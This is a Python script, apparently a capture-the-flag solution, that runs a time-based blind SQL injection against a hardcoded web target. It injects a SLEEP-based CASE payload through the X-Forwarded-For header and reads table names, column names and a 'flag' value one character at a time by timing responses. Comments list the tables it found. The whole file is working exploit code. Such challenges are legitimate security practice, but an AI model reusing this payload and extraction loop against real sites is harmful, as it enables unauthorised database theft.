import requests
import string

import time

char_set = string.ascii_uppercase + string.digits + string.punctuation
target = 'http://120.24.86.145:8002/web15/'

payload_template = "1'+(SELECT CASE WHEN (SUBSTRING(({}) FROM {} FOR 1)='{}') THEN SLEEP(3) ELSE 1 END) AND '1' = '1 "


def get_tables():
    tables = ''
    table_name_query = \
        'SELECT GROUP_CONCAT(table_name SEPARATOR "<>") FROM information_schema.tables WHERE TABLE_SCHEMA = DATABASE()'
    for i in range(1, 33):
        for c in char_set:
            try:
                payload = payload_template.format(table_name_query, i, c)
                requests.get(target, headers={'X-Forwarded-For': payload}, timeout=2)
            except requests.exceptions.ReadTimeout:
                tables += c
                print(tables)
                break

    print(tables)


def get_columns(table_name):
    columns = ''
    column_name_query = \
        f'SELECT GROUP_CONCAT(column_name SEPARATOR "<>") FROM information_schema.columns WHERE table_name="{table_name}"'
    for i in range(1, 33):
        print(i)
        for c in char_set:
            try:
                payload = payload_template.format(column_name_query, i, c)
                requests.get(target, headers={'x-forwarded-for': payload}, timeout=2)
            except requests.exceptions.ReadTimeout:
                columns += c
                print(columns)
                break


# get_tables()
# tables = ['client_ip', 'flag']

# get_columns('flag')
# columns = ['flag']

def get_flag():
    flag = ''
    for i in range(1, 40):
        print(i)
        for c in char_set:
            try:
                payload = payload_template.format('SELECT flag FROM flag', i, c)
                requests.get(target, headers={'x-forwarded-for': payload}, timeout=2)
            except requests.exceptions.ReadTimeout:
                flag += c
                print(flag)
                break


get_flag()
